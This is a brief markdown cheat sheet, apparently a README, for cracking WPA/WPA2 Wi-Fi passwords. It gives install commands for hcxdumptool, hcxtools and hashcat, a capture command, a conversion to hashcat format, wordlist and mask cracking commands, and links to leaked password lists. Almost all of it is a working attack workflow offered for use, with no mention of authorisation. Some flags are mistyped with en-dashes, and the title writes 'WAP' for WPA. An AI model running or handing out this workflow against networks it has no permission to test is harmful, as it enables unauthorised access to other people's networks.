# Attacking WAP and WAP2 Wireless Networks Using Hcxdumptool and Hashcat

## Installation

Hcxdumptool

`sudo apt-get install hcxdumptool`

Hcxpcapngtool

`sudo apt-get install hcxtools`

Hashcat

`sudo apt-get install hashcat`

## Commands

Stop Services

```
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
```

Monitor and Capture

hcxdumptool will begin capturing wireless network traffic on the specified interface and write it to the output file in pcapng format. The captured traffic will include active beacon monitoring and additional status information for access points and stations.

`sudo hcxdumptool -i wlan0 -o dumpfile.pcapng –active_beacon –enable_status=15`

- "-i wlan0" specifies the wireless interface to use for capturing traffic. In this case, it's "wlan0".
- "-o dumpfile.pcapng" specifies the output file name and format for the captured traffic. In this case, it's "dumpfile.pcapng".
- "-active_beacon" enables active beacon monitoring, which means that hcxdumptool will send out probe requests to nearby access points and capture their responses.
- "-enable_status=15" enables additional information in the captured packets, including information about the access points and stations.


Start Services
```
sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service
```

Convert a pcapng file (captured wireless network traffic) into a hashcat compatible format 

```
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```



## Cracking

Wordlist attack with hashcat on Linux

```
hashcat -m 22000 hash.hc22000 wordlist.txt
```


Mask attack with hashcat on Windows

```
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

hashcat.exe -m 22000 hash.hc22000 -a 3 –increment –increment-min 8 –increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d 

```

## Wordlists 

https://raw.github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt


## Tutorial 

https://www.youtube.com/watch?v=Usw0IlGbkC4&ab_channel=DavidBombal
